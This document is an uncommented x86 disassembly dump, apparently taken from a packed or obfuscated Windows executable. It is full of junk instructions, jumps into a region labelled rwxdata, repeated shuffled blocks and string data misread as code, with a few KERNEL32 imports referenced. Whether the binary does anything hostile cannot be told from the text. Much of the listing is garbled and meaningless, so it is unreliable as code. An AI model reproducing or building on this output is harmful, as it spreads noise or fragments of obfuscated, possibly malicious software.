mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_422f0b
push [ esp ]
test edi edi
pushad
lea esp [ esp + 0x28 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
shl si 0x1
call sub_4266eb
add [ eax ] al
inc edi
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
pop ebx
call j_sub_431aea
outsd
insd
insd
popad
outsb
dec esp
imul ebp [ esi + 0x65 ] 0x41
push esp
jb rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
jmp sub_425eba
imul ebp [ esi + 0x61 ] 0x72506574
outsd
arpl [ ebp + 0x73 ] sp
jae __export_name_ptr_table_0(KERNEL32:WideCharToMultiByte)
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
add [ eax ] al
push edi
imul esp [ ebp + 0x43 ] 0x54726168
outsd
dec ebp
jne rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
jmp rwxdata
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
inc esp
inc edx
jns rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
add [ eax ] al
fdiv [ ecx ]
add [ gs : esi + 0xf ] ah
mov edx 0x21e906e5
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
daa
popad
je rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_422f76
cmp eax 0x7f
call sub_422dee
pushad
cmc
pushfd
test eax 0x80000000
mov [ esp ] 0x75
jmp rwxdata
jmp rwxdata
lea esp [ esp + 0x24 ]
je rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
push 0x75399cc2
and eax 0xffff
mov [ esp ] bp
push 0x9a7f5cc9
mov [ esp + 0x4 ] cx
mov [ esp + 0x4 ] bl
lea esp [ esp + 0x8 ]
jmp rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4250b7
call sub_4259ba
add [ eax ] al
inc esi
jb rwxdata
insb
inc ebp
outsb
jbe rwxdata
push esp
stc
bt bx 0xd
test eax eax
pushad
call sub_42247a
add [ eax ] al
inc esi
jb rwxdata
je rwxdata
popad
jo rwxdata
dec ebp
jb rwxdata
nop
fdiv st7
jmp [ eax - 0x78 ]
inc ebp
outsb
jbe rwxdata
je __export_name_ptr_table_4(KERNEL32:GetModuleFileNameA)
imul ebp [ esi + 0x67 ] 0x57
inc edi
je rwxdata
push edi
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
outsb
insd
outsb
je rwxdata
mov [ esp + 0x1c ] 0xc8
lea esp [ esp + 0x40 ]
jb rwxdata
add [ eax ] al
inc edi
je rwxdata
imul ebp [ esi + 0x67 ] 0x3d005773
jg rwxdata
cmc
outsb
jbe rwxdata
insb
add [ eax ] al
add [ ebx + eax * 2 + 0x4d ] cl
push ebx
xor bl [ edi + 0x33 ]
xor ch [ esi ]
insb
je rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
jmp rwxdata
inc eax
outsb
insd
outsb
add [ esi + 0xf ] ah
mov edx 0x20502e7
add [ eax ] al
add [ esi + 0x39 ] ah
outsd
jne rwxdata
add [ eax ] al
jae rwxdata
jb rwxdata
imul esi [ edx + 0x6f ] 0x6e656d6e
imul ebp [ esi + 0x67 ] 0x66004173
mov [ esp ] edx
lea esp [ esp + 0x54 ]
js rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
and al 0x8
je rwxdata
add eax 0x0
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
insb
jb rwxdata
sbb al 0x24
call sub_422b90
add [ eax ] al
dec ecx
outsb
je rwxdata
add [ 0x7f ] bh
je rwxdata
outsb
insd
outsb
je rwxdata
imul esi [ edx + 0x6f ] 0x6e656d6e
je rwxdata
jmp rwxdata
je rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
btr bx 0xd
clc
btc bx di
mov bx [ esi ]
test ax cx
jmp rwxdata
pushad
pushad
mov [ esp ] bl
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
push ebx
call sub_420983
rcr si 0xb
jmp rwxdata
add [ ebp - 0x3ff60608 ] al
push edi
push 0xfbcc92f9
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
imul ebp [ esi + 0x67 ] 0x5773
add [ eax + 0x74 ] cl
je rwxdata
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
shl di cl
movzx di dl
adc di 0xf623
dec edi
add edx ebx
cmc
shl edi 0x7
jne rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
and ebx 0xfff
cmp ch ch
push ebp
call sub_4220f3
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
insb
outsd
jae rwxdata
popad
outsb
insb
add [ gs : esp + edx * 2 + 0x4244489 ] bl
inc ebp
outsb
push edx
jno rwxdata
pushfd
add edx ebx
rol di 0xf
sub di 0x8cf4
not edi
mov [ ebp - 0x4 ] edx
sub di dx
mov edx [ ebp - 0x4 ]
pushfd
mov edi [ edx + 0x10 ]
pushfd
bt di sp
test edi edi
call sub_420614
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
lea edi [ ebp * 2 + 0x645555f6 ]
shl edi cl
mov [ ebp - 0x4 ] edx
mov edx 0x4f8ed0c3
mov edx [ ebp - 0x4 ]
stc
mov di 0x32f8
clc
neg edi
mov edi [ edx + 0x10 ]
cmp al 0xa3
call j_sub_4314f7
pushad
call sub_422c89
movsx di al
mov [ ebp - 0x4 ] edx
neg edi
mov edx [ ebp - 0x4 ]
call sub_426a86
push 0xfaa9aee3
call sub_4320a0
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
inc ecx
dec eax
mov [ esp + 0x20 ] eax
test sp ax
stc
push [ esp ]
mov [ esp + 0x20 ] esi
pushfd
cmc
mov [ esp + 0x4 ] 0x75
mov [ esp + 0x20 ] edi
call sub_42638d
push 0x6aa9aedb
call sub_431bc1
clc
pushad
jae rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
jmp rwxdata
inc ecx
add cl bh
push [ esp + 0x4 ]
cmp ebx 0x3d176e90
add edx ebx
jmp rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
clc
mov edx [ edx + 0x80 ]
sub esp 0xfffffff4
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
bt bx bp
stc
call sub_42633a
test edx edx
push eax
pushfd
push 0xf634786d
lea esp [ esp + 0xc ]
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
daa
popad
je rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
mov edi esi
bts di 0x3
bt bp 0xc
and edi 0x22e35d4d
add edx ebx
movzx di al
cmc
mov [ ebp - 0x4 ] edx
rol dh 0x2
pushfd
dec dh
btc dx sp
mov edx [ ebp - 0x4 ]
rol di cl
call sub_4222e7
add [ eax ] al
inc ebx
insb
outsd
jae rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
inc esp
and al 0x4
inc eax
dec eax
popad
outsb
insb
add dl dl
xchg ebp eax
shrd ax bp 0xa
bsf ax dx
lahf
daa
mov eax ebp
inc bl
adc bl 0xad
mov bl 0x1
push 0x34e5cdfe
test bh bl
pushfd
push 0xf4608972
mov [ esp + 0x14 ] esi
btc si 0x7
pushad
mov esi edi
test ebx 0x661a93ba
sub esi eax
call sub_4229ef
pop ecx
mov ecx [ esp + 0xc ]
jmp rwxdata
jmp rwxdata
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
lea esp [ esp + 0xc ]
je rwxdata
mov [ esp + 0xc ] 0x8e
mov esp ebp
movzx bp dl
pop ebp
pushad
pushad
push [ esp + 0x40 ]
retn 0x44
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_4250d6
mov [ esp ] dx
lea esp [ esp + 0x54 ]
js rwxdata
jmp rwxdata
je rwxdata
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
shl di cl
movzx di dl
adc di 0xf623
dec edi
add edx ebx
cmc
shl edi 0x7
jne rwxdata
pushfd
add edx ebx
rol di 0xf
sub di 0x8cf4
not edi
mov [ ebp - 0x4 ] edx
sub di dx
mov edx [ ebp - 0x4 ]
pushfd
mov edi [ edx + 0x10 ]
pushfd
bt di sp
test edi edi
call sub_420614
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
lea edi [ ebp * 2 + 0x645555f6 ]
shl edi cl
mov [ ebp - 0x4 ] edx
mov edx 0x4f8ed0c3
mov edx [ ebp - 0x4 ]
stc
mov di 0x32f8
clc
neg edi
mov edi [ edx + 0x10 ]
cmp al 0xa3
call j_sub_4314f7
pushad
call sub_422c89
movsx di al
mov [ ebp - 0x4 ] edx
neg edi
mov edx [ ebp - 0x4 ]
call sub_426a86
push 0xfaa9aee3
call sub_4320a0
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
